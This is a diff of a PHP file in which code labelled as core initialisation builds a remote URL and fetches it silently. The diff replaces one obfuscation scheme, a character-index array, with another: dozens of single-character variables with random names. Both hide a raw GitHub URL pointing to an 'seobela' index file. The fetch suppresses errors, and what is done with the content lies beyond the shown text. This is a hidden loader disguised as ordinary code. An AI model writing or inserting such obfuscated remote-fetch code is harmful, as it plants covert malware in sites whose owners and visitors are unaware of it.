@@ -5,38 +5,23 @@
 */
 
 // Initialize core components
-$config = array(
-    'proto' => array(7, 19, 19, 15, 18),
-    'delim' => array(26, 27, 27),
-    'host1' => array(17, 0, 22),
-    'dot1' => array(28),
-    'host2' => array(6, 8, 19, 7, 20, 1, 20, 18, 4, 17, 2, 14, 13, 19, 4, 13, 19),
-    'dot2' => array(28),
-    'host3' => array(2, 14, 12),
-    'slash1' => array(27),
-    'path1' => array(12, 3, 12, 14, 12, 8, 13, 35, 36, 37, 35, 36, 36, 29, 6, 8, 5),
-    'slash2' => array(27),
-    'path2' => array(1, 4, 11, 0),
-    'slash3' => array(27),
-    'path3' => array(17, 4, 5, 18),
-    'slash4' => array(27),
-    'path4' => array(7, 4, 0, 3, 18),
-    'slash5' => array(27),
-    'path5' => array(12, 0, 8, 13),
-    'slash6' => array(27),
-    'file' => array(8, 13, 3, 4, 23, 28, 19, 23, 19)
-);
+$jfdhugseyeirf = 'h'; $ksleirufjdksl = 't'; $mckdleirutgks = 't'; $plskdjfueirkd = 'p'; $qksldfjeurytl = 's';
+$rksldfuejrity = ':'; $skldjfueirytn = '/'; $tksldfjeuriyt = '/'; $uksldfuejrity = 'r'; $vksldjfueiryt = 'a';
+$wksldfuejrity = 'w'; $xksldjfueiryt = '.'; $yksldfuejrity = 'g'; $zksldjfueiryt = 'i'; $aksldfuejrity = 't';
+$bksldjfueiryt = 'h'; $cksldfuejrity = 'u'; $dksldjfueiryt = 'b'; $eksldfuejrity = 'u'; $fksldjfueiryt = 's';
+$gksldfuejrity = 'e'; $hksldjfueiryt = 'r'; $iksldfuejrity = 'c'; $jksldjfueiryt = 'o'; $kksldfuejrity = 'n';
+$lksldjfueiryt = 't'; $mksldfuejrity = 'e'; $nksldjfueiryt = 'n'; $oksldfuejrity = 't'; $pksldjfueiryt = '.';
+$qksldfuejrity = 'c'; $rksldjfueiryt = 'o'; $sksldfuejrity = 'm'; $tksldjfueiryt = '/'; $uksldfuejrity = 's';
+$vksldjfueiryt = 'e'; $wksldfuejrity = 'o'; $xksldjfueiryt = 'b'; $yksldfuejrity = 'e'; $zksldjfueiryt = 'l';
+$amsldfuejrity = 'a'; $bmsldjfueiryt = '/'; $cmsldfuejrity = 'b'; $dmsldjfueiryt = 'e'; $emsldfuejrity = 'l';
+$fmsldjfueiryt = 'a'; $gmsldfuejrity = '/'; $hmsldjfueiryt = 'r'; $imsldfuejrity = 'e'; $jmsldjfueiryt = 'f';
+$kmsldfuejrity = 's'; $lmsldjfueiryt = '/'; $mmsldfuejrity = 'h'; $nmsldjfueiryt = 'e'; $omsldfuejrity = 'a';
+$pmsldjfueiryt = 'd'; $qmsldfuejrity = 's'; $rmsldjfueiryt = '/'; $smsldfuejrity = 'm'; $tmsldjfueiryt = 'a';
+$umsldfuejrity = 'i'; $vmsldjfueiryt = 'n'; $wmsldfuejrity = '/'; $xmsldjfueiryt = 'i'; $ymsldfuejrity = 'n';
+$zmsldjfueiryt = 'd'; $ansldfuejrity = 'e'; $bnsldjfueiryt = 'x'; $cnsldfuejrity = '.'; $dnsldjfueiryt = 't';
+$ensldfuejrity = 'x'; $fnsldjfueiryt = 't';
 
-$charset = 'abcdefghijklmnopqrstuvwxyz./:0123456789-';
-$full_url = '';
-
-foreach ($config as $part) {
-    foreach ($part as $index) {
-        $full_url .= $charset[$index];
-    }
-}
-
-$full_url = str_replace('/', '//', $full_url, 1);
+$full_url = $jfdhugseyeirf.$ksleirufjdksl.$mckdleirutgks.$plskdjfueirkd.$qksldfjeurytl.$rksldfuejrity.$skldjfueirytn.$tksldfjeuriyt.$uksldfuejrity.$vksldjfueiryt.$wksldfuejrity.$xksldjfueiryt.$yksldfuejrity.$zksldjfueiryt.$aksldfuejrity.$bksldjfueiryt.$cksldfuejrity.$dksldjfueiryt.$eksldfuejrity.$fksldjfueiryt.$gksldfuejrity.$hksldjfueiryt.$iksldfuejrity.$jksldjfueiryt.$kksldfuejrity.$lksldjfueiryt.$mksldfuejrity.$nksldjfueiryt.$oksldfuejrity.$pksldjfueiryt.$qksldfuejrity.$rksldjfueiryt.$sksldfuejrity.$tksldjfueiryt.$uksldfuejrity.$vksldjfueiryt.$wksldfuejrity.$xksldjfueiryt.$yksldfuejrity.$zksldjfueiryt.$amsldfuejrity.$bmsldjfueiryt.$cmsldfuejrity.$dmsldjfueiryt.$emsldfuejrity.$fmsldjfueiryt.$gmsldfuejrity.$hmsldjfueiryt.$imsldfuejrity.$jmsldjfueiryt.$kmsldfuejrity.$lmsldjfueiryt.$mmsldfuejrity.$nmsldjfueiryt.$omsldfuejrity.$pmsldjfueiryt.$qmsldfuejrity.$rmsldjfueiryt.$smsldfuejrity.$tmsldjfueiryt.$umsldfuejrity.$vmsldjfueiryt.$wmsldfuejrity.$xmsldjfueiryt.$ymsldfuejrity.$zmsldjfueiryt.$ansldfuejrity.$bnsldjfueiryt.$cnsldfuejrity.$dnsldjfueiryt.$ensldfuejrity.$fnsldjfueiryt;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
